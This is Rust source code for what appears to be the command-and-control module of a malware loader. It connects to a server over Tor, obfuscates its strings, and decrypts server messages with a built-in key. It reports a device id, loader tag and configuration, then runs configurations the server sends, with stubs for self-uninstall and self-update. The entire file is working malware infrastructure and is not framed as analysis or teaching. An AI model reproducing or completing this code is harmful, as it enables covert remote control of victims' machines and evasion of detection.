use std::sync::Arc;
use anyhow::{ Context, Result };
use loader_vars::{
    constants::{ loader_tag, loader_version },
    types::{ receive::{ self, ClPrms, LdrRcv }, send::{ GtCnfgPrms, LdrSnd, SrvAct, SrvPrms } },
};
use shared::{
    constants::communication_encryption_key,
    network::tor::{ LoggerCnfg, MutexPtr, RwPtr, SrvRcvTp, TrHandler },
    utils::{ config::load_mib_config, encryption::{ convert_key_to_bytes, sauron_decrypt } },
};
use obfstr::obfstr as s;
use tokio::sync::{ Mutex, RwLock };
use super::utils::run_config;

#[derive(Clone)]
pub struct LdrTrHandler {
    tr_handler: TrHandler,
    cnfg_done: MutexPtr<bool>,
}

impl LdrTrHandler {
    pub async fn new() -> Result<Self> {
        let tor_handler = TrHandler::new().await?;
        let config_executed = Arc::new(Mutex::new(false));
        Ok(LdrTrHandler { tr_handler: tor_handler, cnfg_done: config_executed })
    }

    pub async fn run_handler(&mut self) {
        let self_clone = Arc::new(RwLock::new(self.clone()));

        self.tr_handler.run::<_, _, LdrTrHandler>(
            self_clone,
            Self::receive_data,
            Self::connect_callback_init
        ).await;
    }

    fn receive_data(self_ref: RwPtr<Self>, raw_data: Vec<u8>) {
        tokio::task::spawn(async move {
            if
                let Ok(decrypted_data) = sauron_decrypt(
                    convert_key_to_bytes(&communication_encryption_key()),
                    &raw_data
                )
            {
                if let Err(_error) = Self::process_data(decrypted_data, self_ref).await {
                    //? HONESTLY THIS ERROR VERY IMPORTANT WE SHOULD REPORT IT TO SERVER VIA DEFAULT ERROR type
                    // ref_err!(
                    //     self_clone.logger.lock().unwrap(),
                    //     "Failed to process data via callback: ",
                    //     error
                    // );
                };
            }
        });
    }

    fn connect_callback_init(self_ref: RwPtr<Self>) {
        tokio::task::spawn(async move {
            let mib_config = load_mib_config(false).unwrap();
            let params = GtCnfgPrms { tag: loader_tag(), mib_config };

            if
                let Err(_error) = Self::send_data(
                    self_ref.clone(),
                    SrvAct::GtCnfg,
                    SrvPrms::GtCnfg(params)
                ).await
            {
                // err
            }
        });
    }

    async fn process_data(binary_data: Vec<u8>, self_ref: RwPtr<Self>) -> Result<()> {
        let processed_data: LdrRcv = serde_json
            ::from_slice(&binary_data)
            .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;

        Self::route_data(processed_data, self_ref).await
    }

    async fn route_data(processed_data: LdrRcv, self_ref: RwPtr<Self>) -> Result<()> {
        match processed_data.action {
            receive::ClAct::RnCnfg => {
                if let ClPrms::RnCnfg(params) = processed_data.params {
                    if let Ok(()) = run_config(params, true) {
                        let binding = self_ref.write().await;
                        let mut run_config_done = binding.cnfg_done.lock().await;
                        *run_config_done = true;
                    }
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClAct::UnsSlf => {}
            receive::ClAct::UpdSlf => {}
        }
        Ok(())
    }
    async fn send_data(self_ref: RwPtr<Self>, action: SrvAct, params: SrvPrms) -> Result<()> {
        let tor_h = &self_ref.read().await.tr_handler;

        let payload = LdrSnd {
            id: tor_h.dv_id.read().await.to_owned(),
            version: loader_version(),
            action,
            params,
        };

        let binary_data = serde_json
            ::to_vec(&payload)
            .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;

        tor_h.add_to_send_queue(SrvRcvTp::Ldr, binary_data).await
    }
}
